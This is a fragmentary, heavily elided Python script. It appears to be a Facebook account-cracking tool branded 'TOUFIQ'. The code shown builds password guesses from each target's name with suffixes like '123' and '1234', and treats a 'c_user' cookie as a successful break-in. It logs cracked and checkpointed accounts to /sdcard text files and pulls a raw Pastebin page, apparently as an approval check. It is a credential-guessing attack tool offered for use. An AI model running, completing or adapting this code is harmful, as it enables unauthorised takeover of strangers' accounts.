...
def main_apv():
    ...
    r1=requests.get("https://pastebin.com/raw/7xNwjib3").text
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/TOUFIQ-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/TOUFIQ-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to RETURN TO TOUFIQ Menu ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[TOUFIQ]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/TOUFIQ_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/TOUFIQ_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      ITX TOUFQW HERE \033[1;37m")
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           ...
                           pwx = [name,xz[0]+'123',xz[0]+'12345',xz[0]+'1234']
